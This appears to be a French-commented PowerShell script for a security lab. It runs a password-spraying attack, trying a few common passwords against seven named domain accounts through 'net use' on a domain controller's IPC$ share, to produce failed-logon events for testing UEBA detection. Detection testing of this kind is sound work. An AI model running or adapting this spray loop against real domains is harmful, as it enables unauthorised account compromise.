<#
.SYNOPSIS
    Simulation de password spraying (MITRE ATT&CK T1110.003) à des fins de
    démonstration UEBA en laboratoire.

.DESCRIPTION
    À exécuter depuis soc-endpoint01 (ou soc-dc01) du domaine SOC.LOCAL.
    Le script tente une authentification réseau pour chaque utilisateur ciblé
    avec un petit ensemble de mots de passe courants. Chaque échec génère un
    événement Windows 4625 (Failed Logon) collecté par l'agent Wazuh, ce qui
    alimente le pipeline UEBA en temps réel.

    USAGE STRICTEMENT PÉDAGOGIQUE — uniquement sur l'environnement de
    laboratoire dont vous êtes propriétaire. Ne jamais exécuter sur un
    système de production ou sans autorisation écrite.

.PARAMETER DomainController
    Nom/FQDN du contrôleur de domaine cible (partage à atteindre).

.PARAMETER DelaySeconds
    Délai entre chaque tentative (défaut : 2s) pour étaler le spray.

.EXAMPLE
    .\simulate_attack.ps1 -DomainController soc-dc01.soc.local
#>

[CmdletBinding()]
param(
    [string]$DomainController = "soc-dc01.soc.local",
    [string]$Domain = "SOC",
    [int]$DelaySeconds = 2
)

# Utilisateurs ciblés (identiques à la campagne analysée des 13 & 16 mai 2026).
$TargetUsers = @("a.amrani", "l.idrissi", "l.mus", "y.ben", "n.alam", "s.ed", "k.alaa")

# Password spraying : peu de mots de passe, beaucoup de comptes (faible verrouillage).
$SprayPasswords = @("Welcome2026!", "Printemps2026", "Password123!")

$share = "\\$DomainController\IPC$"
Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host " Simulation password spraying T1110.003 -> $share" -ForegroundColor Cyan
Write-Host " Cible : $($TargetUsers.Count) utilisateurs x $($SprayPasswords.Count) mots de passe" -ForegroundColor Cyan
Write-Host "==================================================================" -ForegroundColor Cyan

$attempts = 0
$failures = 0
foreach ($password in $SprayPasswords) {
    foreach ($user in $TargetUsers) {
        $attempts++
        $stamp = (Get-Date).ToString("HH:mm:ss")
        $account = "$Domain\$user"
        try {
            # Tentative d'authentification réseau (génère un 4625 en cas d'échec).
            net use $share /user:$account $password 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                Write-Host "[$stamp] $account -> SUCCÈS (déconnexion)" -ForegroundColor Yellow
                net use $share /delete 2>$null | Out-Null
            }
            else {
                $failures++
                Write-Host "[$stamp] $account -> ÉCHEC (4625 généré)" -ForegroundColor Red
            }
        }
        catch {
            $failures++
            Write-Host "[$stamp] $account -> ÉCHEC (exception)" -ForegroundColor Red
        }
        Start-Sleep -Seconds $DelaySeconds
    }
}

Write-Host "==================================================================" -ForegroundColor Cyan
Write-Host " Terminé : $attempts tentatives, $failures échecs (events 4625)" -ForegroundColor Cyan
Write-Host " Vérifier la détection : ueba detect --to-es puis dashboard Kibana" -ForegroundColor Green
Write-Host "==================================================================" -ForegroundColor Cyan
